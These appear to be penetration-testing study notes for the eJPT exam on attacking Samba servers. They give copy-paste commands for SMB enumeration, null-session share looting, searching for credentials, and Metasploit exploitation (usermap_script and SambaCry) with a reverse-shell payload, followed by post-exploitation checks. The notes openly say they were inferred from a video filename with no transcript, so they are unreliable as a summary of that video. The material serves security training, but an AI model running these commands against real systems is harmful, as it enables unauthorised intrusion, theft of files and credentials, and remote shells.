# Targeting SAMBA (eJPT study notes)

Note: No transcript was provided. The following is a conservative, experience-based summary inferred from the filename “12 - Targeting SAMBA.mp4” in the Linux exploitation module and standard eJPT workflows.

## What the video covers (Introduction / big picture)
- How to identify and enumerate SMB/CIFS (Samba) services on Linux targets (ports 139/445).
- Enumerating shares, users, and permissions via null/guest sessions.
- Pulling sensitive data from accessible shares and using found creds for further access.
- Recognizing common vulnerable Samba versions and leveraging well-known exploits (e.g., usermap_script, SambaCry when a writable share exists).
- Practical, exam-ready command flow: Nmap NSE, smbclient/smbmap/enum4linux/rpcclient, and Metasploit exploitation, with post-exploitation basics.

## Flow (ordered)
1. Detect SMB services and versions with Nmap.
2. Run SMB-focused NSE scripts for OS, shares, and users.
3. Try anonymous/guest enumeration of shares with smbclient/smbmap.
4. Recursively loot files; search for creds/keys/configs.
5. Deepen enumeration with enum4linux(-ng) and rpcclient (null session).
6. If creds found, validate and pivot (e.g., SSH) or expand share access.
7. Identify version-specific Samba vulns; confirm preconditions (e.g., writable share).
8. Exploit with Metasploit (e.g., usermap_script; SambaCry if applicable).
9. Post-exploitation checks and cleanup.

## Tools highlighted
- Nmap + NSE (smb-os-discovery, smb-enum-shares, smb-enum-users, smb2-security-mode)
- smbclient (list/connect/share looting)
- smbmap (permissions, recursive listing, searching)
- enum4linux or enum4linux-ng (one-stop SMB enum)
- rpcclient (null-session enumeration of users/groups)
- crackmapexec (optional: quick share/creds/signing checks)
- searchsploit (map versions to known CVEs)
- Metasploit Framework (exploit modules: usermap_script, is_known_pipename)
- mount.cifs (mount shares to loot quickly)

## Typical command walkthrough (detailed, copy-paste friendly)
Set helpers:
```bash
export RHOST=10.10.10.10
export LHOST=10.10.14.3
```

1) Discover SMB and version
```bash
# Fast discovery of SMB
nmap -Pn -n -p 139,445 -sS -sV --reason $RHOST

# Broader reconnaissance
nmap -Pn -n -sS -p- --min-rate 2000 $RHOST
nmap -Pn -n -sV -sC -p 139,445 $RHOST
```

2) SMB NSE enumeration
```bash
nmap -Pn -n -p445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode" $RHOST
```

3) List shares (null/guest first)
```bash
# List shares with null session
smbclient -L "//$RHOST" -N

# If SMB1 needed (older Samba)
smbclient -L "//$RHOST" -N -m SMB1
```

4) Connect and loot with smbclient
```bash
# Connect anonymously to a share (replace SHARE)
smbclient "//$RHOST/SHARE" -N

# Inside smbclient prompt:
# smb: \> commands to mass-download
recurse ON
prompt OFF
ls
mget *
exit
```

5) Use smbmap to map permissions and search
```bash
# Null session enumeration of shares and perms
smbmap -H $RHOST -u '' -p ''

# Recursive list all shares (if allowed)
smbmap -H $RHOST -u '' -p '' -r

# Search for juicy files across a share
# Example: search for creds/keys/flags/configs
smbmap -H $RHOST -u '' -p '' -R SHARE -A '(flag|pass|user|cred|key|id_rsa|.conf)$' -q
```

6) One-stop enumeration
```bash
# Classic
enum4linux -a $RHOST

# Or the newer Python version
enum4linux-ng -A $RHOST
```

7) rpcclient null session (user/group enum)
```bash
# One-liners
rpcclient -U "" -N $RHOST -c "lsaquery; enumdomusers; enumdomgroups"

# Interactive
rpcclient -U "" -N $RHOST
# rpcclient> lsaquery
# rpcclient> enumdomusers
# rpcclient> enumdomgroups
# rpcclient> querydispinfo 0
# rpcclient> lookupnames username
# rpcclient> quit
```

8) Mount share for bulk looting
```bash
sudo mkdir -p /mnt/smb
# Try guest first; adjust vers=1.0 for SMB1 servers
sudo mount -t cifs "//$RHOST/SHARE" /mnt/smb -o guest,vers=1.0
# Or with creds (example)
# sudo mount -t cifs "//$RHOST/SHARE" /mnt/smb -o username=USER,password='PASS',vers=2.1
```

9) Map version to vulns (quick triage)
```bash
# From Nmap version string, search known Samba CVEs
searchsploit samba | egrep -i "usermap|trans2|known pipe|cve-2017-7494|3\.0\.20|3\.5|4\."
```

10) Metasploit exploitation examples

- Samba usermap_script (commonly demoed; Samba 3.0.20-era)
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS $RHOST
# RPORT defaults to 139; set if needed: set RPORT 139
set PAYLOAD cmd/unix/reverse
set LHOST $LHOST
run
```

- SambaCry CVE-2017-7494 (requires a writable share)
```bash
msfconsole -q
use exploit/linux/samba/is_known_pipename
show options
set RHOSTS $RHOST
# If auth is needed:
# set SMBUser USER
# set SMBPass PASS
set LHOST $LHOST
run
```

11) Post-exploitation basics (Linux)
```bash
id; uname -a
whoami && hostname && ip a
# Quick SUID check for privesc
find / -perm -4000 -type f 2>/dev/null
# Check Samba config (on compromised host)
cat /etc/samba/smb.conf 2>/dev/null
```

## Practical tips
- Always attempt null/guest first (-N or -u '' -p '').
- Switch SMB dialects when you get protocol errors:
  - smbclient -m SMB1 (older Samba)
  - mount.cifs -o vers=1.0/2.0/2.1/3.0 depending on target.
- smbclient tips: use recurse ON and prompt OFF to bulk download; use lcd to set local dir.
- smbmap is excellent for quick permission mapping and targeted file searches.
- enum4linux(-ng) often pulls usernames via RID cycling even with null sessions.
- rpcclient can enumerate users/groups without creds on misconfigured Samba.
- If you find credentials, try:
  - SMB share access (smbmap/smbclient)
  - SSH login (often the real goal on Linux)
- Samba RCE paths:
  - usermap_script exploit for very old Samba 3.0.20 (Metasploitable/legacy).
  - SambaCry (CVE-2017-7494) when a world-writable share exists and the server loads shared libraries via a named pipe—Metasploit module handles plumbing.
- Don’t assume Windows-only NSE vulns (e.g., ms17-010) are relevant; focus on Samba-specific findings.
- Document share names, permissions, and looted files for the exam report.

## Minimal cheat sheet (one-screen flow)
```bash
# 1) Discover
export RHOST=10.10.10.10; export LHOST=10.10.14.3
nmap -Pn -n -p 139,445 -sS -sV $RHOST
nmap -Pn -n -p445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb2-security-mode" $RHOST

# 2) Shares (null)
smbclient -L "//$RHOST" -N
smbmap -H $RHOST -u '' -p '' -r

# 3) Loot
smbclient "//$RHOST/SHARE" -N -m SMB1 << 'EOF'
recurse ON
prompt OFF
ls
mget *
EOF

# 4) Deep enum
enum4linux -a $RHOST
rpcclient -U "" -N $RHOST -c "lsaquery; enumdomusers; enumdomgroups"

# 5) Mount if needed
sudo mkdir -p /mnt/smb
sudo mount -t cifs "//$RHOST/SHARE" /mnt/smb -o guest,vers=1.0

# 6) Vulns
searchsploit samba | egrep -i "usermap|known pipe|cve-2017-7494"

# 7) Exploit (example: usermap_script)
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS $RHOST; set PAYLOAD cmd/unix/reverse; set LHOST $LHOST; run"
```

## Summary
- Targeting Samba on Linux starts with identifying SMB on 139/445, then enumerating OS, shares, and users with Nmap NSE and classic SMB tools.
- Attempt null/guest access first; recursively loot for creds/keys/configs.
- Use smbmap/enum4linux/rpcclient to deepen enumeration; validate any creds and pivot (often to SSH).
- Map server version and configuration to known Samba vulns. In training/labs, usermap_script (Samba 3.0.20) and SambaCry (CVE-2017-7494 with writable share) are common demos; Metasploit provides stable exploits for both.
- After gaining a shell, enumerate and escalate on the Linux host as needed.